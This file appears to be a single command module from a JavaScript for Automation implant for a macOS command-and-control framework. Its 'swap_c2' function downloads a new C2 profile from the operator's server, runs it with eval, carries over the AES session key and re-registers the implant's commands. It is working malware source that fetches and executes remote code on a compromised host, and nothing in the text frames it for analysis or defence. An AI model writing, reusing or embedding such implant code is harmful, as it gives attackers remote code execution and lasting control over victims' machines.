exports.swap_c2 = function(task, command, params){
    let config = JSON.parse(params);
    let profile = C2.upload(task, config['profile']);
    try{
        let file_data = $.NSString.alloc.initWithDataEncoding(profile, $.NSUTF8StringEncoding).js;
        let key = C2.aes_psk;
        eval(file_data);
        C2.aes_psk = key;
        C2.exchanging_keys = false;
        //now that our new c2 is set, update the commands list
        C2.setConfig({"commands": Object.keys(commands_dict)});
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
    return JSON.stringify({"user_output":C2.getConfig(), "completed": true});
};
COMMAND_ENDS_HERE